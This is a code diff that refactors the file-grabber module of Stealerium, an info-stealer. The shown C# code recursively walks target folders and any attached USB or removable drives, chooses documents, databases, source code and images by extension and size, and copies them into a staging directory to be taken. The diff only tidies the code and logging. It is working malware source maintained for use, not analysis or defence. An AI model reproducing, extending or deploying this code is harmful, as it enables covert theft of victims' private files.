@@ -27,141 +27,109 @@ namespace Stealerium.Target.System
             switch (type)
             {
                 case "Document":
-                {
                     Counter.GrabberDocuments++;
                     break;
-                }
                 case "DataBase":
-                {
                     Counter.GrabberDatabases++;
                     break;
-                }
                 case "SourceCode":
-                {
                     Counter.GrabberSourceCodes++;
                     break;
-                }
                 case "Image":
-                {
                     Counter.GrabberImages++;
                     break;
-                }
             }
 
             return type;
         }
 
-
-        // Detect file type by name
+        // Detect file type by extension
         private static string DetectFileType(string extensionName)
         {
-            var fileExtension = extensionName
-                .Replace(".", "").ToLower();
+            var fileExtension = extensionName.Replace(".", "").ToLower();
             foreach (var type in Config.GrabberFileTypes)
-            foreach (var extension in type.Value)
-                if (fileExtension.Equals(extension))
+            {
+                if (type.Value.Contains(fileExtension))
                     return RecordFileType(type.Key);
+            }
 
             return null;
         }
 
-
-        // Grab file
+        // Grab a file
         private static void GrabFile(string path)
         {
-            // Check file size
             var file = new FileInfo(path);
-            if (file.Length > Config.GrabberSizeLimit) return;
-            // Check file name
-            if (file.Name == "desktop.ini") return;
-            // Check file type
-            var type = DetectFileType(file.Extension);
-            if (type == null) return;
-            // Get directory and file paths to copy
+
+            // Check file size limit, desktop.ini exclusion, and file type
+            if (file.Length > Config.GrabberSizeLimit || file.Name == "desktop.ini") return;
+            var fileType = DetectFileType(file.Extension);
+            if (fileType == null) return;
+
+            // Determine the copy paths
             var copyDirectoryName = Path.Combine(_savePath, Path.GetDirectoryName(path)
-                .Replace(Path.GetPathRoot(path), "DRIVE-" + Path.GetPathRoot(path).Replace(":", "")));
+                .Replace(Path.GetPathRoot(path), $"DRIVE-{Path.GetPathRoot(path).Replace(":", "")}"));
             var copyFileName = Path.Combine(copyDirectoryName, file.Name);
-            // Create directory to copy. If not exists
+
+            // Create directory if not exists and copy the file
             if (!Directory.Exists(copyDirectoryName))
                 Directory.CreateDirectory(copyDirectoryName);
-            // Copy file to created directory
             file.CopyTo(copyFileName, true);
         }
 
-
-        // Grab all files from directory
+        // Grab all files from a directory
         private static void GrabDirectory(string path)
         {
-            // If directory not exists => stop
-            if (!Directory.Exists(path))
-                return;
-            // Get directories and files
-            string[] dirs, files;
+            if (!Directory.Exists(path)) return;
+
             try
             {
-                dirs = Directory.GetDirectories(path);
-                files = Directory.GetFiles(path);
-            }
-            catch (UnauthorizedAccessException)
-            {
-                return;
-            }
-            catch (AccessViolationException)
-            {
-                return;
-            }
+                var dirs = Directory.GetDirectories(path);
+                var files = Directory.GetFiles(path);
 
-            // Grab files from directory and scan other directories
-            foreach (var file in files)
-                GrabFile(file);
-            foreach (var dir in dirs)
-                try
-                {
+                // Grab files and recursively scan directories
+                foreach (var file in files)
+                    GrabFile(file);
+
+                foreach (var dir in dirs)
                     GrabDirectory(dir);
-                }
-                catch
-                {
-                    // ignored
-                }
+            }
+            catch (UnauthorizedAccessException) { }
+            catch (AccessViolationException) { }
         }
 
-        // Run file grabber
+        // Run the file grabber
         public static void Run(string sSavePath)
         {
             try
             {
-                // Set save path
                 _savePath = sSavePath;
-                // Add USB, CD drives to grabber
+
+                // Add USB, CD drives to target directories
                 foreach (var drive in DriveInfo.GetDrives())
+                {
                     if (drive.DriveType == DriveType.Removable && drive.IsReady)
                         TargetDirs.Add(drive.RootDirectory.FullName);
-                // Create save directory if not exists
+                }
+
+                // Ensure save directory exists
                 if (!Directory.Exists(_savePath))
                     Directory.CreateDirectory(_savePath);
-                // Threads list
-                var threads = new List<Thread>();
-                // Create threads
-                foreach (var dir in TargetDirs)
-                    try
-                    {
-                        threads.Add(new Thread(() => GrabDirectory(dir)));
-                    }
-                    catch
-                    {
-                        // ignored
-                    }
 
-                // Run threads
-                foreach (var t in threads)
-                    t.Start();
-                // Wait threads
-                foreach (var t in threads.Where(t => t.IsAlive))
-                    t.Join();
+                // Create and start threads for each target directory
+                var threads = TargetDirs.Select(dir => new Thread(() => GrabDirectory(dir))).ToList();
+                foreach (var thread in threads) thread.Start();
+
+                // Wait for all threads to complete
+                foreach (var thread in threads)
+                {
+                    if (thread.IsAlive)
+                        thread.Join();
+                }
             }
             catch (Exception ex)
             {
-                Console.WriteLine(ex);
+                Logging.Log($"Error during FileGrabber run: {ex.Message}");
             }
         }
     }
